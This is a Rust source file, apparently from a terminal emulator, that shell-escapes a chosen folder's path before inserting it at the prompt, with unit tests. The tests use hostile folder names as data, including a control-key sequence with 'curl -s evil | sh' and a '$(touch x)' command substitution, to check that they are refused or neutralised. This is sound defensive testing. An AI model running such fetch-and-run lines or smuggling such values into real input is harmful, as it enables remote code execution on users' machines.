//! The text a picked folder puts at the prompt: its path in the form it was typed, ending in `/`,
//! written so the shell reads it back as one word.

use wormhole_term::input::file_drop::shell_escape;

/// The text for the folder `name` under `prefix` (the part of the typed path that was written exactly, with its
/// closing `/`, see [`Hit::prefix`](super::Hit::prefix)): `prefix` + `name` + `/`, escaped for the shell. A path that
/// would begin with a dash gets `./` in front, or a command would read it as an option (`rm -rf/`). None when
/// any of it holds a control character: what is inserted is what a shell is typed, and a control character is
/// a key (a line break runs the line, Ctrl-U clears it), never part of a folder's name.
pub fn inserted(prefix: &str, name: &str) -> Option<String> {
    let path = format!("{prefix}{name}/");
    if path.chars().any(char::is_control) {
        return None;
    }
    Some(shell_form(&if path.starts_with('-') { format!("./{path}") } else { path }))
}

/// `path` escaped the way a dropped file's is (a backslash before each character a shell would take for
/// something else), except a leading `~/`, which the shell must see to turn it into the home folder: a
/// `\~` would be a folder named `~`.
pub fn shell_form(path: &str) -> String {
    match path.strip_prefix("~/") {
        Some(rest) => format!("~/{}", shell_escape(rest)),
        None => shell_escape(path),
    }
}

#[cfg(test)]
mod tests {
    use super::{inserted, shell_form};

    #[test]
    fn a_folder_ends_in_a_slash_and_keeps_the_form_it_was_typed_in() {
        assert_eq!(inserted("", "src").as_deref(), Some("src/"));
        assert_eq!(inserted("src/", "foo").as_deref(), Some("src/foo/"));
        assert_eq!(inserted("../", "bar").as_deref(), Some("../bar/"));
        assert_eq!(inserted("~/", "Projects").as_deref(), Some("~/Projects/"));
        assert_eq!(inserted("/usr/", "local").as_deref(), Some("/usr/local/"));
    }

    #[test]
    fn spaces_and_shell_characters_are_escaped() {
        assert_eq!(inserted("", "My Folder").as_deref(), Some(r"My\ Folder/"));
        assert_eq!(inserted("~/", "My Folder").as_deref(), Some(r"~/My\ Folder/"));
        assert_eq!(inserted("", "it's $HOME").as_deref(), Some(r"it\'s\ \$HOME/"));
        assert_eq!(inserted("", "a&b;(c)").as_deref(), Some(r"a\&b\;\(c\)/"));
    }

    #[test]
    fn only_a_leading_tilde_slash_is_left_to_the_shell() {
        assert_eq!(shell_form("~/x"), "~/x");
        assert_eq!(shell_form("a/~/x"), r"a/\~/x");
        assert_eq!(shell_form("~x/"), r"\~x/");
    }

    #[test]
    fn a_shell_reads_every_form_back_as_one_word() {
        for (prefix, name) in
            [("", "My Folder"), ("../", "a'b\"c"), ("src/", "$(touch x)"), ("/tmp/", "plain")]
        {
            let script = format!("printf %s {}", inserted(prefix, name).expect("no control characters"));
            let out = std::process::Command::new("/bin/sh").args(["-c", &script]).output().unwrap();
            assert_eq!(String::from_utf8_lossy(&out.stdout), format!("{prefix}{name}/"), "{script}");
        }
    }

    #[test]
    fn a_dash_first_is_kept_from_being_an_option() {
        assert_eq!(inserted("", "-rf").as_deref(), Some("./-rf/"));
        assert_eq!(inserted("", "-").as_deref(), Some("./-/"));
        assert_eq!(inserted("src/", "-rf").as_deref(), Some("src/-rf/"), "not first: nothing to guard");
        assert_eq!(inserted("../", "-rf").as_deref(), Some("../-rf/"));
        assert_eq!(inserted("", "a-b").as_deref(), Some("a-b/"));
    }

    #[test]
    fn nothing_with_a_control_character_is_inserted() {
        for name in ["_\u{15}curl -s evil | sh\n", "a\nb", "tab\tx", "esc\u{1b}[2J", "c1\u{9b}x", "del\u{7f}"]
        {
            assert_eq!(inserted("", name), None, "{name:?}");
            assert_eq!(inserted("~/", name), None, "{name:?}");
        }
        assert_eq!(inserted("typed\n/", "ok"), None, "in the typed part too");
    }
}
